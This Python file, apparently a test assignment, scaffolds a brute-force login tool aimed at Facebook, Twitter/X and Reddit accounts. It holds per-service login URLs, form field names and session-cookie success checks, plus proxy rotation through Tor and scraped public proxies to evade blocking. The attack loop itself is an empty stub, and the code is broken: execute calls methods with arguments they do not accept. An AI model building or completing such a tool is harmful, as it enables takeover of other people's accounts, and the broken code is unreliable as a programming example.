from proxyscrape import create_collector, get_collector
import time
import requests
import argparse
import os

avoidance_patterns = [
    r"^[0-9]+$",  # Avoid using all numeric passwords
    r"^[a-zA-Z]+$",  # Avoid using all alphabetic passwords
    r"^[a-zA-Z0-9]+$",  # Avoid using alphanumeric patterns
    # добавить больше шаблонов
]

proxies = [
    "http://1.1.1.1:8080",
    "http://2.2.2.2:8080",
    # прокси
]

class Bruter:
    def __init__(self, service, username, wordlist, delay, fb_name=None, verbose=False):
        self.service = service
        self.username = username
        self.wordlist = wordlist
        self.delay = delay
        self.fb_name = fb_name
        self.session = requests.Session()
        self.verbose = verbose
        self.start_time = time.time()
        self.attempts = 0
        self.proxies = [
            "socks5://127.0.0.1:9050",  # TOR
            "http://127.0.0.1:8080",    # HTTP
        ]

        try:
            collector = create_collector('my_collector', ['http', 'https'])
            proxy_list = collector.get_proxies()
            if proxy_list:
                self.proxies.extend([f"http://{proxy.host}:{proxy.port}" for proxy in proxy_list])
        except Exception as e:
            if self.verbose:
                print(f"[Warning] Error loading proxies: {str(e)}")
            print("[*] Using default proxy configuration")

        self.service_configs = {
            'facebook': {
                'url': 'https://www.facebook.com/login',
                'data': lambda u, p: {'email': u, 'pass': p},
                'success': lambda r: 'c_user' in r.cookies
            },
            'twitter': {
                'url': 'https://x.com/i/flow/login',
                'data': lambda u, p: {'username': u, 'password': p},
                'success': lambda r: 'auth_token' in r.cookies
            },
            'reddit': {
                'url': 'https://www.reddit.com/login',
                'data': lambda u, p: {'user': u, 'passwd': p},
                'success': lambda r: 'reddit_session' in r.cookies
            }
        }
    def usercheck(self):
        pass
    
    def webBruteforce(self):
        pass

    def execute(self):
        if self.usercheck(self.username) == 1:
            print(f"[Error] Username '{self.username}' does not exist")
            exit(1)

        if self.service.startswith('http'):
            print("[*] Custom URL: Skipping username check")
        else:
            print(f"[+] Username '{self.username}' found")

        self.webBruteforce(self.username, self.wordlist, self.service, self.delay)

def main():
    parser = argparse.ArgumentParser(
        description="Тестовое задание Ецин"
    )
    required = parser.add_argument_group("required arguments")
    required.add_argument("-s", "--service", dest="service", required=True,
                          help="Service name (facebook, etc.) or full URL")
    required.add_argument("-u", "--username", dest="username", required=True)
    required.add_argument("-w", "--wordlist", dest="password", required=True)
    parser.add_argument("-d", "--delay", type=int, dest="delay", default=1,
                        help="Delay between attempts (default: 1)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show detailed output for each attempt")

    args = parser.parse_args()

    service = args.service
    username = args.username
    wordlist = args.password
    delay = args.delay or 1
    fb_name = None

    if not os.path.exists(wordlist):
        print("[Error] Wordlist not found")
        exit(1)

    if service == "facebook":
        fb_name = input("Please Enter the Name of the Facebook Account: ")
        os.system("clear")

    br = Bruter(service, username, wordlist, delay, fb_name=fb_name, verbose=args.verbose)
    br.execute()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[91m[!] Operation cancelled by user\033[0m")
        os.system("rm -rf tmp/")
        exit(1)